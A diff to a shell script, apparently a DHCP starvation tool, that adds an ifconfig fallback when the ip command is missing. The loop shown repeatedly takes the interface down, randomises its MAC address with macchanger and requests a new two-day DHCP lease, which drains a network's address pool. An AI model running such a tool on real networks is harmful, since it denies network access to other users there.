@@ -32,6 +32,13 @@ then
 	exit 3
 fi
 
+if [ -n "$(which ip)" ]
+then
+	IPCommand=true
+else
+	IPCommand=false
+fi
+
 LEASETime=172800 # 2 days = 172800s
 
 PIDFile="/tmp/dhcp-starvation.dhclient.${interface}.pid"
@@ -61,19 +68,26 @@ while true; do
 	rm -f "${PIDFile}" "${LEASEFile}"
 
 	# We disable our interface
-	ip link set "${interface}" down
-	#ifconfig "${interface}" down
-
-	ip add flush "${interface}"
-	#ifconfig "${interface}" 0.0.0.0
+	if ${IPCommand}
+	then
+		ip link set "${interface}" down
+		ip add flush "${interface}"
+	else
+		ifconfig "${interface}" down
+		ifconfig "${interface}" 0.0.0.0
+	fi
 
 	echo -n "$((++NumberAddress))] "
 	# We switch our MAC address for out interface
 	macchanger -a "${interface}" | grep '^New MAC:'
 
 	# We enable again our interface
-	ip link set "${interface}" up
-	#ifconfig "${interface}" up
+	if ${IPCommand}
+	then
+		ip link set "${interface}" up
+	else
+		ifconfig "${interface}" up
+	fi
 
 	# We get a new DHCP Lease
 	if ! dhclient -v "${interface}" -pf "${PIDFile}" -lf "${LEASEFile}" -cf "${CONFIGFile}" 2>&1 | grep DHCPACK
